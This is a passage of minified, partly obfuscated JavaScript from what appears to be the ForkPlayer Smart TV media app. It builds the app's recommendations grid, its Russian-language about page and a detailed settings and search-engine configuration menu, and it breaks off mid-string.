function breakScreen(u){lI1I1IxFCIh1l01llYpr("navigate",'<span id="navinfo2" style="color:gray;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+"<span id='navurl' style='font-weight: bold;padding-left: 5px;overflow:hidden;'>"+getNavU(u)+"</span>");lI1I1IxFCIh1l01llYpr("infoList","");lI1I1IxFCIh1l01llYpr("content","");sethash()}
function setVars(f,n){if(f=="search"){var nn=getVars("start");nn.search=n;f="start";n=nn}
if(f=="start"){var ke=["before","br","id"];for(var i in n.fav){if(n.fav[i]==null)delete n.fav[i];else{for(var j in ke){if(typeof n.fav[i][ke[j]]!="undefined")delete n.fav[i][ke[j]]}}}
var np={"config":n.config,"fav":n.fav,"search":n.search};if(typeof n.hidetop!="undefined")np.hidetop=n.hidetop;kjtYpr.lll0Il11OxICbl1ll0Ypr("glstart",llIl1I1HlMgNII1IO0Ypr(np))}}
function delDupl(ch1,ch2){var ex="|";for(i=0;i<ch1.length;i++)ex+=gV(ch1[i],"playlist_url")+""+gV(ch1[i],"stream_url")+"|";for(i=0;i<ch2.length;i++){if(ex.indexOf("|"+gV(ch2[i],"playlist_url")+""+gV(ch2[i],"stream_url")+"|")>=0){ch2.splice(i,1);i--}else{ex+=gV(ch2[i],"playlist_url")+gV(ch2[i],"stream_url")+"|"}}
return ch2}
function getTop(ch){var tmp={},ctop=[];for(var i in userTop){var z=""+userTop[i].c;while(z.length<10)z="0"+z;var k=z+gV(userTop[i],"tp")+i;tmp[k]={"playlist_url":i};for(var j in userTop[i])tmp[k][j]=userTop[i][j]}
function ksort(obj){var keys=[],sortedObj={};for(k in obj){if(obj.hasOwnProperty(k)){keys.push(k)}}
keys.sort();len=keys.length;for(i=len-1;i>=0;i--){sortedObj[keys[i]]=obj[keys[i]]}
return sortedObj}
tmp=ksort(tmp);var nx=0,fe="";for(var i in tmp){fe=tmp[i].playlist_url;if(tmp[i].c>5)ctop.push({"source":"usertop","c":tmp[i].c,"title":tmp[i].title,"description":""+getInfoUrl(tmp[i].playlist_url),"logo_30x30":tmp[i].logo_30x30,"playlist_url":tmp[i].playlist_url,"parser":tmp[i].parser});if(nx++>100){delete userTop[fe]}}
var deftop=l0QO11lOz0bfh10l0Ypr(cached.start);if(deftop!=null){for(var i in deftop.channels){ctop.push(deftop.channels[i])}}
if(parseInt(kjtYpr.GL.third)!=1){for(var i=0;i<ctop.length;i++)if(gV(ctop[i],"source")=="third"){ctop.splice(i,1);i--}}
var defgrid=[];var np=Math.ceil(4*(ch.config.best/3));if(userGrid!=null){try{$.each(userGrid.stlast,function(ii,val){if(!is_xxx(val)&&defgrid.length<np){if(gV(val,"play_url")!=""&&gV(val,"play_url")!=gV(val,"stream_url")){var el=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(val));var el2=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(val));el.display_title=el.title=gV(val,"parser")+val.stream_url;el.position="list";el2.display_title=el2.title=el2.stream_url=el2.play_url;el2.parser="";el2.position="list";if(typeof val.menu!="object")val.menu=[];var tch={"title":val.title,"logo_30x30":val.logo_30x30,"playlist_url":"submenu","submenu":[el,el2]}}else tch=val;tch.menu=[val.menu[0],{"title":val.time+" ago","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=grid&type=stlast"}];defgrid.push(tch)}});var ex="";$.each(userGrid.pllast,function(ii,val){if(!is_xxx(val)&&defgrid.length<2*np){val.ch.menu=[{"title":val.time+" ago","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=grid&type=pllast"}];defgrid.push(val.ch);ex+=val.ch.playlist_url+"..."}});$.each(userGrid.pltop,function(ii,val){if(defgrid.length<5*np&&ex.indexOf(val.ch.playlist_url+"...")==-1){val.ch.menu=[{"title":val.time+" "+val.c+"times","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=grid&type=pltop"}];defgrid.push(val.ch)}})}catch(e){kjtYpr.popUp("Error user grid "+e.message,1500)}}
console.log(defgrid);if(typeof ch.hidetop=="object"){for(var i=0;i<ctop.length;i++)if(ch.hidetop[gV(ctop[i],"playlist_url")+""+gV(ctop[i],"stream_url")]){ctop.splice(i,1);i--}}
ctop=delDupl(ch.fav,ctop);ctop=delDupl(defgrid,ctop);var ctop2=[];for(var i=0;i<defgrid.length;i++){ctop2.push(defgrid[i])}
for(var i=0;i<ctop.length;i++){ctop2.push(ctop[i])}
ctop=ctop2;for(var i=0;i<ctop.length;i++)if(i>=ch.config.best*9){ctop.splice(i,1);i--}
return ctop}
function getVars(n,pq){if(n.indexOf("about:info")==0){var data={"align":"left","title":"<b>Контакты и Условия использования</b>","channels":[{"title":"Назад","playlist_url":"cmd:historyback(-2);","position":"hlink"}]};data.before="<div style='margin: 20px auto;width: 90%;background: #586367;padding: 10px; border-radius: 5px;font-size:80%;'>"+"Перед вами кроссплатформенное приложение  для создания настраиваемых мультимедийных страниц (состоящих из видео, аудиофайлов, изображений, текстов и ссылок). Он не содержит никакого контента и представляет собой так называемое приложение White Label. Вы можете создать свой собственный контент или открывать существующий и общий контент от других людей. Весь контент написан в формате JSON (JavaScript Object Notation), XML или M3U с простой и удобной структурой. Созданные файлы страниц могут размещаться на любом HTTP-сервере, поддерживающем CORS (Cross-Origin Resource Sharing).<br>"+"Особенности:<br>"+"- Создавайте простые или сложные медиа-страницы как в исходном коде так и с помощью готовых cистем управления содержимым (CMS).<br>"+"- Легко перемещайтесь по этим страницам мультимедиа с помощью пульта дистанционного управления или указателя.<br>"+"- Воспроизведение нескольких видео / аудио файлов в списке воспроизведения.<br>"+"- Показать несколько изображений в слайд-шоу.<br>"+"- Во время просмотра видео или прослушивания аудиофайла одновременно просматривайте другие страницы мультимедиа (видео / аудиофайл продолжает работать в фоновом режиме).<br>"+"- Открывать ссылки в полноэкранном режиме.<br>"+"Это приложение не несет ответственности за Контент созданный сторонними авторами не выступает в их поддержку.<br>"+"<span style='color:yellow;'>Сообщества поддержки приложения:<br>"+"https://t.me/forkplayertv (7 тыс. участников)<br>https://t.me/ForkPlayer (1 тыс. участников)<br>https://t.me/Pro_ForkPlayer (8 сот. участников)<br>https://t.me/fork_player (2 сот. участников)<br>"+"VK: https://vk.com/smarttv_ru<br></span>"+"</div>"}else if(n.indexOf("about:yoursearchEngines")==0){var data={"title":"_FPNaitiVglobPoiske_"};data["chan"+"nels"]=[];if(oInset[insetActive].history.length>1){var ttl=nmlz(oInset[insetActive].history[oInset[insetActive].history.length-1].title).split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
var title=n.split("yoursearchEngines|")[1];ttl=nmlz(title.replace(/\s+/g," ")).split(" ");console.log("ttl0="+ttl);if(title.indexOf("<div")==0){ttl=title.match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с|Х\/ф)/ig," ").replace(/\s+/g," ").split(" ");console.log("ttl="+ttl)}
var s="";for(var i=0;i<ttl.length;i++){if(ttl[i]==" "||ttl[i]=="")continue;s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}
var ort=ttl.join(" ");if(ort.indexOf("Сезон")>=0){var mtc=ort.match(/сезон.*?- (.*)/i);if(mtc!=null){s=mtc[1];data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
return data}else if(n.indexOf("about:settings")==0){var data={"title":"Settings"};var se=getVars("getconfig");var c=n.replace(/\?.*$/,"").split("#");if(c.length>1){var d=c[1].split(":");if(d[0]=="setconfig"){if(d[1]=="defstart"){delete se.config;delete se.fav;delete se.hidetop;userTop={};kjtYpr.lll0Il11OxICbl1ll0Ypr("datas","");setVars("start",se);se=getVars("start");kjtYpr.inf("OK!",1300)}else if(d[1]=="clearhide"){delete se.hidetop;setVars("start",se);kjtYpr.inf("OK!",1300)}else if(d[1]=="cleartop"){kjtYpr.lll0Il11OxICbl1ll0Ypr("datas","");userTop={};kjtYpr.inf("OK!",1300)}else if(d[1]=="order"){if(exinobj(se.config.order,d[2])){$.each(se.config.order,function(ii,val){if(d[2]==val)se.config.order.splice(ii,1)})}else{var x=0;for(var i in startL){if(startL[i]==d[2])break;if(exinobj(se.config.order,startL[i]))x++}
se.config.order.splice(x,0,d[2])}
setVars("start",se)}else{if(d[2]==1||d[2]==0)d[2]=parseInt(d[2]);se.config[d[1]]=d[2];setVars("start",se)}
console.log(" start"+gP().lIQ0Il1IlIb1Il1OYpr);if(gP().lIQ0Il1IlIb1Il1OYpr=="about:blank"){console.log("reload start");oInset[insetActive].reload();return}}else if(d[0]=="reset"){confirmed.create("_FPSbrositNastr_ _FPprilozheniya_?<br>_FPVsaeZaklUd_!? ").fun0=function(){console.log("reset");sbrosok()};return}else{console.log(d);if(d[2]=="manual"&&d[1]!="player"&&d[1]!="streamplayer"){d[2]=pq.inputed.text;if(d[1].match(/^(torrserve|acestream)/)){if(d[2].indexOf(".")==-1||d[2].indexOf(":")==-1)return{"cmd":"stop();","notify":"Error! Enter IP:PORT example 192.168.0.1:8090"}}
if(d[1].match(/^(udp)/)){if(!d[2].match(/^https?:\/\/./))return{"cmd":"stop();","notify":"Error! Enter http url of UDP server"}}
if(d[1].match(/^(remote)/)){if(d[2].indexOf(".")==-1)return{"cmd":"stop();","notify":"Error! Enter IP example 192.168.0.1"}}
returnVK(1);console.log(d[2])}
kjtYpr.GL[d[1]]=d[2];if(d[1]=="ts"){TS=d[2];kjtYpr.lll0Il11OxICbl1ll0YprC("ts",d[2]);kjtYpr.lll0Il11OxICbl1ll0Ypr("ts",d[2])}
console.log("kjtYpr.GL["+d[1]+"]="+kjtYpr.GL[d[1]]);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));if(gV(d,3)=="return")return;if(d[1].match(/(remote|torrserve|acestream)/))l0OI10IRge011lO1Ypr();if(d[1].match(/(pr|sidebar)/))FXMLPage.lIlO1OI1Mlt001lIYpr();if(d[1].match(/zoom/))FXMLPage.setZoom(1)}
handler="menu"}
if(kjtYpr.virtual)var vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_untrust.png")+"' title='Информация об идентификаторе берется с памяти и может меняться, например при сбросе тв к заводским или обновлении ПО' >";else vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_trust.png")+"' title='Информация об идентификаторе берется с характеристик ТВ (мак адрес или androidid), менятся может при смене типа подключения' >";if(user!=null)data.navigate+=' box_user:'+user.email;else data.navigate+=' box_user: (Войдите в аккаунт!)';if(platform=="tizen")data.navigate+=" "+platform;try{if(platform=="sams"||platform=="tizen")data.navigate+=" "+box_client;if(platform=="android-device"){data.navigate+=' Build: '+kjtYpr.build}}catch(e){}
if(box_low)data.navigate+=" low ";if(box_low2)data.navigate+=" low2 ";data.navigate+=' Server:'+nServer+' ('+ipCountry.substr(0,2)+') ';ch=[];var m=[];for(var i in _lang)m.push({"title":i+" "+_lang[i]._name,"playlist_url":"about:settings#set:lang:"+i});if(_lang[kjtYpr.GL.lang]==undefined)kjtYpr.GL.lang="ru";ch.push({"title":"Language ","description":kjtYpr.GL.lang+" "+_lang[kjtYpr.GL.lang]._name,"logo_30x30":_img("_ST_settings/language.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"title":"_FPSet name_ ","description":kjtYpr.GL.name,"search_on":"search_on","value":kjtYpr.GL.name,"playlist_url":"about:settings#set:name:manual","logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html"});m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i})}
ch.push({"title":"_FPTime offset_","description":((kjtYpr.GL.JTVRegion>0)?"+"+kjtYpr.GL.JTVRegion:kjtYpr.GL.JTVRegion),"logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPStartovoeMenu_","playlist_url":"about:settings#set:recovery:0"},{"title":"_FPPrRabStogoMesta_","playlist_url":"about:settings#set:recovery:1"}];ch.push({"title":"_FPNachGrupa_","description":((kjtYpr.GL.recovery=="true"||kjtYpr.GL.recovery===!0||kjtYpr.GL.recovery==1)?"_FPPrRabStogoMesta_":"_FPStartovoeMenu_"),"logo_30x30":_img("_ST_settings/start.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(30),"playlist_url":"about:settings#set:ts:0"},{"title":shint(31),"playlist_url":"about:settings#set:ts:1"}];ch.push({"title":"_FPStore data_","description":shint(30+parseInt(kjtYpr.GL.ts)),"logo_30x30":_img("_ST_settings/save.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:adult:0"},{"title":shint(1),"playlist_url":"about:settings#set:adult:1"}];ch.push({"br":1,"title":"_FPAdult content_","description":shint(kjtYpr.GL.adult),"logo_30x30":_img("_ST_settings/padlock.png"),"is_parent_lock":1,"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:passwordkey:"},{"title":"_FPVvedNov_ _FPParol_","search_on":"search_on","type":"password","playlist_url":"about:settings#set:passwordkey:manual"}];ch.push({"is_parent_lock":1,"title":"_FPRodKontr_","description":shint(kjtYpr.GL.passwordkey,"p"),"logo_30x30":_img("_ST_settings/padlock.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(kjtYpr.build>=7||1){m=[{"title":"built-in","playlist_url":"about:settings#set:keyboard:"},{"title":"system","playlist_url":"about:settings#set:keyboard:system"}];ch.push({"title":"_FPKey"+"board_","description":(kjtYpr.GL.keyboard!=""?kjtYpr.GL.keyboard:"built-in"),"logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m})}
ch.push({"after":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPStart Page_</div>","title":"_FPAdjust weather_","logo_30x30":_img("_ST_settings/wat.png"),"template":tmpl_box,"position":"html","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=weather&id=set"});var br=1;for(var i in startL){var def=exinobj(se.config.order,startL[i]);ch.push({"br":br,"title":startN[startL[i]],"template":tmpl_box,"position":"html","logo_30x30":"http://check"+(def?"true":"false"),"description":"","playlist_url":"about:settings#setconfig:order:"+startL[i]+":"+(def?"0":"1")});br=0}
ch.push({"br":1,"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPYour search engines_","description":"","playlist_url":"about:configsearch"});m=[];for(var i=0;i<=5;i++)m.push({"title":i+" строк","playlist_url":"about:settings#setconfig:best:"+i});ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPRecommendation_","description":"<span style='font-weight:bold;border:1px solid gray;padding:0px 3px;'>"+se.config.best+" _FProws_  &#9660; </span><br>_FPHistory based recommendations_","playlist_url":"menu","menu":m});ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPClear recommendation_","description":"_FPLength history_ "+kjtYpr.l1O0l1gmmv01O11Ypr("datas").length+"bytes","playlist_url":"about:settings#setconfig:cleartop"});if(typeof se.hidetop=="object"){var dop=0;for(var i in se.hidetop)dop++;ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"Восстановить скрытые рекоммендации","description":"Скрытые URL: "+dop,"playlist_url":"about:settings#setconfig:clearhide"})}
m=[{"title":"_FPRecommendation_","playlist_url":"about:settings#setconfig:besttop:1"},{"title":"_FPFavorites_","playlist_url":"about:settings#setconfig:besttop:0"}];ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPSetDefaultStartMenu_","description":"","playlist_url":"confirm","confirm":["about:settings#setconfig:defstart"]});m=[];for(var i in exPl)m.push({"title":sPlayer[exPl[i]],"playlist_url":"about:settings#set:player:"+exPl[i]});ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>Video & Audio</div>","logo_30x30":_img("_ST_settings/video.png"),"title":"_FPVideopleer_","description":sPlayer[kjtYpr.GL.player],"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in exPlV)m.push({"title":sPlayer[exPlV[i]],"playlist_url":"about:settings#set:streamplayer:"+exPlV[i]});ch.push({"title":"IPTV+HLS _FPpleer_","description":sPlayer[kjtYpr.GL.streamplayer],"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_settings/video-player1.png"),"playlist_url":"menu","menu":m});m=[];for(var i in sQual)m.push({"title":sQual[i]+"p","playlist_url":"about:settings#set:quality:"+i});ch.push({"title":"_FPKachVideo_","description":sQual[kjtYpr.GL.quality]+"p","logo_30x30":_img("_ST_settings/1080.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(platform=="sams"||uaJ=="mag"||uaJ=="dune")var maxr=1;else if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")maxr=4;else maxr=3;m=[];for(var i=0;i<maxr;i++)m.push({"title":shint(i,"a"),"playlist_url":"about:settings#set:audioplayer:"+i});ch.push({"title":"_FPAudioMini_ _FPpleer_","description":shint(kjtYpr.GL.audioplayer,"a"),"logo_30x30":_img("_ST_settings/audio.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(20),"playlist_url":"about:settings#set:pip:0"},{"title":shint(21),"playlist_url":"about:settings#set:pip:1"},{"title":shint(22),"playlist_url":"about:settings#set:pip:2"},{"title":shint(13),"playlist_url":"about:settings#set:pip:3"}];ch.push({"title":"PIP","description":shint(20+parseInt(kjtYpr.GL.pip)),"logo_30x30":_img("_ST_settings/pip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in sNext)m.push({"title":sNext[i],"playlist_url":"about:settings#set:next:"+i});ch.push({"br":1,"title":"_FPRezhim_","description":sNext[kjtYpr.GL.next],"logo_30x30":_img("_ST_settings/playlist.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(10),"playlist_url":"about:settings#set:sortiptv:0"},{"title":shint(11),"playlist_url":"about:settings#set:sortiptv:1"},{"title":shint(12),"playlist_url":"about:settings#set:sortiptv:2"},{"title":shint(13),"playlist_url":"about:settings#set:sortiptv:3"}];ch.push({"title":"_FPSortirovka_ IPTV","description":shint(10+parseInt(kjtYpr.GL.sortiptv)),"logo_30x30":_img("_ST_settings/sort.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:headers:0"},{"title":shint(1),"playlist_url":"about:settings#set:headers:1"}];ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>Network</div>","title":"_FPSend_ _FPheaders_","description":shint(kjtYpr.GL.headers),"logo_30x30":_img("_ST_settings/send.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(50),"playlist_url":"about:settings#set:serv:"}];var x=0;for(var i in uHelper.rCurl){if(timestamp>2)m.push({"title":"cURL "+(x+1),"playlist_url":"about:settings#set:serv:"+x});x++}
m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:serv:-1"});function stser(a){if(a==-1)var x="_FPOtkl._";else if(a=="")x="_FPAuto_";else x="cURL "+(++a);return x}
ch.push({"title":"CORS page proxy","description":stser(kjtYpr.GL.serv),"logo_30x30":_img("_ST_settings/script.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(kjtYpr.GL.remoteip=="")var ds="_FPEnter_ IP:PORT";else ds="_FPManually_ "+kjtYpr.GL.remoteip;m=[{"title":shint(0),"playlist_url":"about:settings#set:remote:0"},{"title":shint(2),"playlist_url":"about:settings#set:remote:2"},{"title":ds,"search_on":"search_on","value":kjtYpr.GL.remote,"filter":"answer","playlist_url":"about:settings#set:remote:manual"}];ch.push({"title":"LOCAL_IP Remote&DLNA","description":shint(kjtYpr.GL.remote),"logo_30x30":_img("_ST_settings/ip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:torrserve:0"},{"title":"This device 127.0.0.1","playlist_url":"about:settings#set:torrserve:127.0.0.1:8090"},{"value":kjtYpr.GL.torrserve,"filter":"answer","title":"_FPEnter_ IP:PORT "+shint(kjtYpr.GL.torrserve),"search_on":"search_on","playlist_url":"about:settings#set:torrserve:manual"}];ch.push({"title":"TORRSERVE_IP","description":shint(kjtYpr.GL.torrserve),"logo_30x30":_img("_ST_settings/torser.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:acestream:0"},{"title":"This device 127.0.0.1","playlist_url":"about:settings#set:acestream:127.0.0.1:6878"},{"title":"_FPEnter_ IP:PORT "+shint(kjtYpr.GL.acestream),"filter":"answer","value":kjtYpr.GL.acestream,"search_on":"search_on","playlist_url":"about:settings#set:acestream:manual"}];ch.push({"title":"ACE_IP Ace Stream","description":shint(kjtYpr.GL.acestream),"value":kjtYpr.GL.acestream,"logo_30x30":_img("_ST_settings/ace_stream.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:udp:0"},{"title":"_FPEnter_ IP:PORT "+shint(kjtYpr.GL.udp),"search_on":"search_on","value":kjtYpr.GL.udp,"filter":"answer","playlist_url":"about:settings#set:udp:manual"}];ch.push({"br":1,"title":"_FPUDP-to-HTTP Proxy_","description":shint(kjtYpr.GL.udp),"search_on":"IP:PORT UDP-to-HTTP Proxy","logo_30x30":_img("_ST_settings/ip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i=75;i<=250;i++)if(i%25==0)m.push({"title":i+"%","playlist_url":"about:settings#set:zoom:"+i});ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPInterface Setup_</div>","title":"_FPZoom_","description":kjtYpr.GL.zoom+"%","logo_30x30":_img("_ST_settings/list.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:sidebar:0"},{"title":shint(1),"playlist_url":"about:settings#set:sidebar:1"}];ch.push({"title":"_FPBookmark toolbar_","description":shint(parseInt(kjtYpr.GL.sidebar)),"logo_30x30":_img("_ST_settings/bookmark.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:pr:0"});for(var i=10;i<=100;i+=10)m.push({"title":i+"%","playlist_url":"about:settings#set:pr:"+i});ch.push({"title":"_FPTransparency in the interface_","description":kjtYpr.GL.pr+"%","logo_30x30":_img("_ST_settings/opacity.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0,7),"playlist_url":"about:settings#set:scrsaver:0"},{"title":shint(1,7),"playlist_url":"about:settings#set:scrsaver:1"}];ch.push({"title":"_FPScreensaver_","description":shint(kjtYpr.GL.scrsaver,7),"logo_30x30":_img("_ST_settings/screensaver.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:rate:0"},{"title":shint(1),"playlist_url":"about:settings#set:rate:1"}];ch.push({"title":"_FPShow rating_","description":shint(parseInt(kjtYpr.GL.rate)),"logo_30x30":_img("_ST_settings/review.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in f_font)m.push({"title":f_font[i],"playlist_url":"about:settings#set:font:"+f_font[i]});ch.push({"br":1,"title":"_FPFont_","description":((kjtYpr.GL.font=="")?"LG Display":f_font[kjtYpr.GL.font]),"logo_30x30":_img("_ST_settings/font.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in f_cols)m.push({"title":f_cols[i],"playlist_url":"about:settings#set:color:"+f_cols[i]});ch.push({"title":"_FPCvetText_","description":" Color "+(kjtYpr.GL.color+1),"logo_30x30":_img("_ST_settings/color-selection.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"title":"_FPFonRisunok_","description":"","logo_30x30":getFon(kjtYpr.l1O0l1gmmv01O11Ypr("mf")),"template":tmpl_box,"position":"html","playlist_url":"https://raw.githubusercontent.com/komivp/appinfodl/main/static/fon/index.php"});ch.push({"br":1,"before":"<div style='text-align:center;'>","after":"</div>","title":"_FPPolnSbrosNastr_","logo_30x30":"none","template":""+tmpl_button+"","position":"html","playlist_url":"about:settings#reset"});data={"align":"left","icon":"none","typeList":"start","title":"_FPSettings_","before":"<div style='float:right;color:gray;margin-right:15px;font-size:50%;'> "+gV(loader_platform)+" "+uaJ+" "+innerW+"x"+innerH+" Cors: "+app_cors+" "+(kjtYpr.build?"Android build: "+kjtYpr.build:"")+" User ID: "+(user==null?"Нет.":user.email)+" Device ID: "+vtt+kjtYpr.mac+"</div><div style='text-align:left;font-size:110%;margin:3px;'>Settings</div><div style='font-size:90%;'>","after":"</div>","channels":ch};if(n.indexOf("#")>0){gP().channels=ch;gP().renderChannels(getSelect(),"update");return}}else if(n.indexOf("about:configsearch")==0){console.log(n);var x=n.split("#");oInset[insetActive].loadPage.lIQ0Il1IlIb1Il1OYpr=x[0];var data={"navigate":"_FPNastrGlPoisk_","typeList":"start"};if(x.length==2){var se=getVars("start");var ds=-1;for(var i=0;i<se.search.sites.length;i++){if(se.search.sites[i].dop==2)ds=i}
x=x[1].split(":");if(x[0]=="move"){if(se.search[x[1]].length>1){var x1=x[3];if(x[2]=="up"){if(x[3]==0)var x2=se.search[x[1]].length-1;else x2=x1-1}else if(x[2]=="down"){if(x[3]==se.search[x[1]].length-1)var x2=0;else x2=1+1*x1}
if(x[3]==se.search.ds)se.search.ds=x2;else if(x2==se.search.ds)se.search.ds=x[3];oldselect=x2;var tmp=se.search[x[1]][x1];se.search[x[1]][x1]=se.search[x[1]][x2];se.search[x[1]][x2]=tmp}else kjtYpr.inf("Ошибка перемещения! Только один элемент в списке "+x[1],1500)}else if(x[0]=="setDop"){if(x[3]==2&&ds>=0)se.search.sites[ds].dop=1;se.search.sites[x[2]].dop=1*x[3]}else if(x[0]=="delsites"){se.search.sites.splice(parseInt(x[1]),1)}else if(x[0]=="save"){var wr=0;var p="sites";if(gV(pq.input,"egsurl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else if(!gV(pq.input,"egsurl").match(/%s/))kjtYpr.inf("Ссылка должна содержать параметр запроса %s!",1800);else if(!gV(pq.input,"egsurl").match(/^(https?|html):\/\//))kjtYpr.inf("Ссылка должна начинаться с http://, html:// или https:// !",1800);else{if(x[2]=="new"){x[2]=se.search[p].length;se.search[p].push({})}
se.search[p][x[2]].url=gV(pq.input,"egsurl");if(gV(pq.input,"egstitle")=="New search"){var m=gV(pq.input,"egsurl").match(/\/\/(.*?)\//);if(m!=null)pq.input.egstitle=m[1]}
se.search[p][x[2]].title=gV(pq.input,"egstitle");se.search[p][x[2]].logo=gV(pq.input,"egslogo");if(gV(pq.input,"egsenabled")==2&&ds>=0)se.search.sites[ds].dop=1;se.search[p][x[2]].dop=1*gV(pq.input,"egsenabled");se.search[p][x[2]].type="";kjtYpr.inf("Установлен URL "+pq.input.egsurl,1500);wr=1}
if(!wr)return}else if(x[0]=="edit"){oInset[insetActive].loadPage.lIQ0Il1IlIb1Il1OYpr=n;var ttl="Редактировать";if(gV(x,2)=="new"){ttl="Добавить";if(typeof pq.elCh["new"]=="object")var t=pq.elCh["new"];else t={"title":"New search","logo":"","url":""};var enabled=1;var dop="включено дополнительно"}else{t=se.search.sites[x[2]];if(se.search.ds==x[2]||se.search.sites[x[2]].dop==2){enabled=2;dop="<span style='color:green;font-weight:bold;'>включено по умолчанию </span>"}else if(se.search.sites[x[2]].dop){enabled=1;dop="включено дополнительно"}else{enabled=0;dop="<span style='color:red;'>отключено</span>"}}
var mn=[{"title":"Использовать по умолчанию","playlist_url":"payd_egsenabled","value":"2"},{"title":"Использовать дополнительно","playlist_url":"payd_egsenabled","value":"1"},{"title":"Отключить ","playlist_url":"payd_egsenabled","value":"0"}];var cX=0,cY=0;var data={"all_after":"<div style='margin:5px;clear: both;'></div>","all_template":'<div style="text-align:left;width:900px;height:25px; font-size: 24px;word-break: break-all;  margin: 4px; border-radius: 5px;     padding: 5px 16px 6px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>',"navigate":"_FPNastrGlPoisk_","typeList":"start","before":"<div style='text-align:left;margin:3px 20px;'><b>"+ttl+" поисковую систему</b></div>","title":t.title,"navigate":"Редатирование "+t.title,"channels":[{"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Название</div>","title":""+t.title,"playlist_url":"payd_egstitle","value":t.title,"search_on":"Название","position":"html"},{"br":1,"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Иконка<div style='text-align:left;font-size: 17px;'> необязательно</div></div>","title":""+t.logo,"logo_30x30":t.logo,"playlist_url":"payd_egslogo","value":t.logo,"search_on":"Иконка (необязательно)","position":"html"},{"br":1,"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>URL<div style='text-align:left;font-size: 17px;'>должен быть c параметром %s вместо 